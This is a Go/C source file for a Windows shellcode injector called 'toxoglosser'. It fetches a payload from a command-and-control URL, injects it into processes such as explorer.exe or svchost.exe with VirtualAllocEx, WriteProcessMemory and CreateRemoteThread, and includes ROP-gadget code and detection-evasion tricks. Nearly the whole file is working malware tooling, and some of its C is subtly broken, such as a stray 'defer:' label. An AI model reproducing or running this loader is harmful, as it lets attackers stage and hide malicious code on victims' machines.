// toxoglosser.go (Go + C + ASM with embedded shellcode)
package main

/*
#cgo LDFLAGS: -lpsapi
#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>

// Redefine SYSTEM_MODULE_INFORMATION and related structs for CGO
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;


// Function to find a gadget signature within a module
LPVOID find_gadget(HMODULE hModule, const char* signature, size_t sig_len) {
    if (hModule == NULL) {
        return NULL;
    }

    MODULEINFO moduleInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hModule, &moduleInfo, sizeof(moduleInfo))) {
        return NULL;
    }

    char* base_addr = (char*)moduleInfo.lpBaseOfDll;
    size_t module_size = moduleInfo.SizeOfImage;

    for (size_t i = 0; i < module_size - sig_len; i++) {
        if (memcmp(&base_addr[i], signature, sig_len) == 0) {
            return (LPVOID)(&base_addr[i]);
        }
    }
    return NULL;
}


// Dynamically builds a ROP chain to call VirtualProtect
// This is a simplified example. A real-world scenario would be more complex.
BOOL GenerateROPChain(HANDLE hProcess, LPVOID shellcodeAddr, DWORD shellcodeSize, LPVOID* ropChainAddr, DWORD* ropChainSize) {
    HMODULE hNtdll = GetModuleHandle("ntdll.dll");
    if (hNtdll == NULL) {
        return FALSE;
    }

    // Find gadgets in ntdll.dll
    // Signatures for "pop rcx; ret", "pop rdx; ret", "pop r8; ret", "pop r9; ret"
    char pop_rcx_ret[] = {0x59, 0xc3};
    char pop_rdx_ret[] = {0x5a, 0xc3};
    char pop_r8_ret[]  = {0x41, 0x58, 0xc3};
    char pop_r9_ret[]  = {0x41, 0x59, 0xc3};

    LPVOID pop_rcx = find_gadget(hNtdll, pop_rcx_ret, sizeof(pop_rcx_ret));
    LPVOID pop_rdx = find_gadget(hNtdll, pop_rdx_ret, sizeof(pop_rdx_ret));
    LPVOID pop_r8  = find_gadget(hNtdll, pop_r8_ret, sizeof(pop_r8_ret));
    LPVOID pop_r9  = find_gadget(hNtdll, pop_r9_ret, sizeof(pop_r9_ret));

    if (pop_rcx == NULL || pop_rdx == NULL || pop_r8 == NULL || pop_r9 == NULL) {
        // Fallback: A real implementation might try other gadgets or techniques
        return FALSE;
    }
    
    LPVOID virtual_protect_addr = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
    if (virtual_protect_addr == NULL) {
        return FALSE;
    }

    // Construct the ROP chain on the heap
    // The size is 8 bytes for each address/value
    *ropChainSize = 8 * 10; 
    UINT64* rop_chain = (UINT64*)malloc(*ropChainSize);
    if (rop_chain == NULL) {
        return FALSE;
    }

    DWORD oldProtect;
    LPVOID oldProtectAddr = VirtualAllocEx(hProcess, NULL, sizeof(DWORD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(oldProtectAddr == NULL) {
        free(rop_chain);
        return FALSE;
    }

    int i = 0;
    rop_chain[i++] = (UINT64)pop_rcx;
    rop_chain[i++] = (UINT64)shellcodeAddr;         // 1st arg: lpAddress
    rop_chain[i++] = (UINT64)pop_rdx;
    rop_chain[i++] = (UINT64)shellcodeSize;         // 2nd arg: dwSize
    rop_chain[i++] = (UINT64)pop_r8;
    rop_chain[i++] = (UINT64)PAGE_EXECUTE_READWRITE; // 3rd arg: flNewProtect
    rop_chain[i++] = (UINT64)pop_r9;
    rop_chain[i++] = (UINT64)oldProtectAddr;        // 4th arg: lpflOldProtect
    rop_chain[i++] = (UINT64)virtual_protect_addr;  // Call VirtualProtect
    rop_chain[i++] = (UINT64)shellcodeAddr;         // Jump to shellcode

    *ropChainAddr = rop_chain;
    return TRUE;
}


DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    defer: CloseHandle(snapshot);

    if (Process32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, processName) == 0) {
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }

    return 0;
}
*/
import "C"
import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"syscall"
	"unsafe"
	_ "embed"

	"golang.org/x/sys/windows"
	"toxoglosser/payloads"
	"toxoglosser/core"
	"toxoglosser/utils"
	"time"
)

const (
    PROCESS_ALL_ACCESS = syscall.STANDARD_RIGHTS_REQUIRED | syscall.SYNCHRONIZE | 0xFFF
    MEM_COMMIT         = 0x1000
    MEM_RESERVE        = 0x2000
    MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE
    PAGE_READWRITE     = 0x04
    PAGE_EXECUTE_READ  = 0x20
    PAGE_EXECUTE_READWRITE = 0x40
)

func inject(pid C.DWORD, processName string, payload []byte) bool {
	if pid == 0 {
		fmt.Fprintf(os.Stderr, "[-] Could not find process '%s'.\n", processName)
		return false
	}
	fmt.Printf("[+] Found target process '%s' with PID: %d\n", processName, pid)

	hProcess, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(pid))
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to open process %s (%d): %v\n", processName, pid, err)
		return false
	}
	defer syscall.CloseHandle(hProcess)
	fmt.Printf("[+] Obtained handle to process %s (%d)\n", processName, pid)

	// Use manual API resolution instead of LazyDLL
	virtualAllocExAddr, err := core.ManualGetProcAddress("kernel32.dll", "VirtualAllocEx")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to resolve VirtualAllocEx: %v\n", err)
		return false
	}

	writeProcessMemoryAddr, err := core.ManualGetProcAddress("kernel32.dll", "WriteProcessMemory")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to resolve WriteProcessMemory: %v\n", err)
		return false
	}

	createRemoteThreadAddr, err := core.ManualGetProcAddress("kernel32.dll", "CreateRemoteThread")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to resolve CreateRemoteThread: %v\n", err)
		return false
	}

	// Use syscall.Syscall6 to call the resolved API functions
	shellcodeAddr, _, err := syscall.Syscall6(
		virtualAllocExAddr,
		5,
		uintptr(hProcess),
		0,
		uintptr(len(payload)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
		0,
	)
	if shellcodeAddr == 0 {
		fmt.Fprintf(os.Stderr, "[-] Failed to allocate memory in %s (%d): %v\n", processName, pid, err)
		return false
	}
	fmt.Printf("[+] Allocated %d bytes at 0x%x in %s (%d)\n", len(payload), shellcodeAddr, processName, pid)

	var bytesWritten uintptr
	writeRet, _, writeErr := syscall.Syscall6(
		writeProcessMemoryAddr,
		5,
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
		uintptr(unsafe.Pointer(&bytesWritten)),
		0,
	)
	if writeErr != 0 || writeRet == 0 {
		fmt.Fprintf(os.Stderr, "[-] Failed to write shellcode to %s (%d): %v\n", processName, pid, writeErr)
		return false
	}
	fmt.Printf("[+] Wrote %d bytes of shellcode to %s (%d)\n", bytesWritten, processName, pid)

	// Change memory protection to RX (Read-Execute) using direct syscalls instead of ROP chain
	oldProtect := uint32(0)
	regionSize := uintptr(len(payload))
	err = core.NtProtectVirtualMemory(windows.Handle(hProcess), &shellcodeAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to change memory protection in %s (%d): %v\n", processName, pid, err)
		return false
	}

	hThread, _, threadErr := syscall.Syscall6(
		createRemoteThreadAddr,
		6,
		uintptr(hProcess),
		0,
		0,
		shellcodeAddr, // Start of the shellcode (direct execution, no ROP chain)
		0,
		0,
	)

	if hThread == 0 {
		fmt.Fprintf(os.Stderr, "[-] Failed to create remote thread in %s (%d): %v\n", processName, pid, threadErr)
		return false
	}

	fmt.Printf("[+] Payload injected into %s (%d). Mission accomplished.\n", processName, pid)
	return true
}

// DownloadPayloadFromC2 fetches payload from C2 server
func DownloadPayloadFromC2(url string, key string) ([]byte, error) {
	// Create HTTP client with basic configuration to avoid simple detections
	client := &http.Client{
		Timeout: 30 * time.Second,
	}

	fmt.Printf("[*] Downloading payload from C2: %s\n", url)
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	payload, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if len(payload) == 0 {
		return nil, fmt.Errorf("received empty payload")
	}

	// If key is provided, attempt to decrypt
	if key != "" && len(key) > 0 {
		fmt.Println("[*] Decrypting payload...")
		keyBytes := make([]byte, 32) // AES-256
		copy(keyBytes, []byte(key))

		decrypted, err := payloads.DecryptPayload(payload, keyBytes)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt payload: %v", err)
		}
		payload = decrypted
	}

	return payload, nil
}

func main() {
	if runtime.GOARCH != "amd64" {
		fmt.Fprintln(os.Stderr, "[-] This tool requires an x64 architecture.")
		os.Exit(1)
	}

	// --- Command-line flag parsing ---
	// Make URL required, remove embedded shellcode option
	stageURL := flag.String("url", "", "URL to fetch the STAGED payload from (required).")
	stageKey := flag.String("key", "", "Key to decrypt staged payload if encrypted.")
	payloadFile := flag.String("file", "", "Path to the shellcode file to execute (fallback).")
	targetProcessName := flag.String("pname", "", "Name of the target process.")
	targetPidFlag := flag.Int("pid", 0, "PID of the target process.")
	verbose := flag.Bool("v", false, "Enable verbose output.")

	flag.Parse()

	// --- Payload selection - STAGED approach is now primary ---
	var payload []byte
	var err error

	// Primary: Staged payload from URL
	if *stageURL != "" {
		payload, err = DownloadPayloadFromC2(*stageURL, *stageKey)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to download staged payload: %v\n", err)
			os.Exit(1)
		}
		fmt.Printf("[+] Successfully downloaded and processed staged payload (%d bytes)\n", len(payload))
	} else if *payloadFile != "" {
		// Fallback: Local file
		fmt.Printf("[*] Loading payload from file (fallback): %s\n", *payloadFile)
		payload, err = ioutil.ReadFile(*payloadFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read shellcode file: %v\n", err)
			os.Exit(1)
		}
	} else {
		// No payload source provided - require URL now
		fmt.Fprintln(os.Stderr, "[-] No payload source provided. Use -url to specify a staged payload URL.")
		fmt.Fprintln(os.Stderr, "Usage: toxoglosser -url http://c2-server/payload.bin [options]")
		os.Exit(1)
	}

	if len(payload) == 0 {
		fmt.Fprintln(os.Stderr, "[-] No shellcode to execute. Staged payload download failed.")
		os.Exit(1)
	}

	// Verify payload looks like valid shellcode (basic check)
	if len(payload) < 10 {
		fmt.Fprintln(os.Stderr, "[-] Payload too small to be valid shellcode (< 10 bytes)")
		os.Exit(1)
	}

	// --- Target process selection and injection ---
	injected := false
	if *targetPidFlag != 0 {
		// Target a specific PID
		pid := C.DWORD(*targetPidFlag)
		injected = inject(pid, fmt.Sprintf("PID:%d", pid), payload)
	} else if *targetProcessName != "" {
		// Target a specific process name
		pid := C.GetProcessIdByName(C.CString(*targetProcessName))
		injected = inject(pid, *targetProcessName, payload)
	} else {
		// Hunt for a suitable process from a default list
		fmt.Println("[*] No target specified. Hunting for a suitable process...")
		defaultTargets := []string{"explorer.exe", "svchost.exe", "services.exe", "spoolsv.exe"}
		for _, processName := range defaultTargets {
			fmt.Printf("[*] Hunting for '%s'...\n", processName)
			pid := C.GetProcessIdByName(C.CString(processName))
			if pid != 0 {
				if inject(pid, processName, payload) {
					injected = true
					break // Exit loop on first successful injection
				}
			}
		}
	}

	if !injected {
		fmt.Fprintln(os.Stderr, "[-] Injection failed. No suitable target process was found or could be injected into.")
		os.Exit(1)
	}

	// Add obfuscated sleep to avoid immediate detection
	if *verbose {
		fmt.Println("[*] Injection completed successfully, exiting after delay")
	}
	utils.AdvancedSleepWithObfuscation(1000 * time.Millisecond)
}